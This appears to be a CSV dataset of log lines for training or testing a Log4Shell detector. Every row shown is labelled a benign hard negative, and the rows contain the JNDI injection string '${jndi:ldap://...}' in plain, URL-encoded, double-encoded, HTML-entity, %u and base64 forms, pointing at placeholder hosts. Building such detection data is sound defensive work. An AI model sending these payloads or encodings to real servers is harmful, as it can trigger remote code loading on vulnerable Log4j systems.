id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004182,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0029,assert literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0029,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004183,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0030,training note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0030,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004184,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0031,security_review indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0031,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004185,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kb2NzLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0032,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kb2nzlmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0032,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004186,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0033,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0033,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004187,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://defensive-lab.example/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0034,info escaped_code_sample value='\${jndi:ldap://defensive-lab.example/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0034,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004188,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0035,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0035,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004189,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fkb.internal%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0036,get /docs/search?q=${jndi:ldap://kb.internal/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0036,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004190,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0037,info escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0037,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004191,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0038,training note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0038,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004192,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0039,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0039,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004193,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0040,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0040,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004194,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0041,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0041,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004195,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0042","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0042",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004196,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0043,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0043,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004197,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-hard_negative_test-0044,training note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-hard_negative_test-0044,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004198,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9wbGF5Ym9vay5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0045,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9wbgf5ym9vay5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0045,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004199,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0046,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0046,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004200,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0047","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0047",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004201,2026-05-17,hard_negative,JNDI configuration loaded successfully for internal naming service trace_id=hardneg-hard_negative_test-0048,jndi configuration loaded successfully for internal naming service trace_id=hardneg-hard_negative_test-0048,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004202,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0049,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0049,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004203,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0050,assert literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0050,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004204,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fplaybook.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0051,get /kb/log4shell?sample=${jndi:ldap://playbook.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0051,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004205,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0052,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0052,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004206,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;playbook.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0053,get /preview?html=${jndi:ldap://playbook.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0053,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004207,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0054,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0054,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004208,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0055,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0055,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004209,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0056,security_review indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0056,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004210,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-hard_negative_test-0057,user searched for log4j mitigation guide trace_id=hardneg-hard_negative_test-0057,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004211,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0058,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0058,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004212,2026-05-17,hard_negative,JNDI configuration loaded successfully for internal naming service trace_id=hardneg-hard_negative_test-0059,jndi configuration loaded successfully for internal naming service trace_id=hardneg-hard_negative_test-0059,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004213,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0060","info json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0060",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004214,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0061,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0061,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004215,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0062,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0062,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004216,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0063","info json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0063",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004217,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0064","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0064",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004218,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0065","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0065",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004219,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0066","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0066",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004220,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0067,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0067,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004221,2026-05-17,hard_negative,Documentation page contains ${jndi:ldap://example.com} as escaped text trace_id=hardneg-hard_negative_test-0068,documentation page contains ${jndi:ldap://example.com} as escaped text trace_id=hardneg-hard_negative_test-0068,0,benign,documentation_example,mixed,hard_negative_test,low
LS-004222,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0069,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0069,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004223,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0070,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0070,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004224,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0071,security_review indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0071,0,benign,benign_scanner_report,mixed,hard_negative_test,low
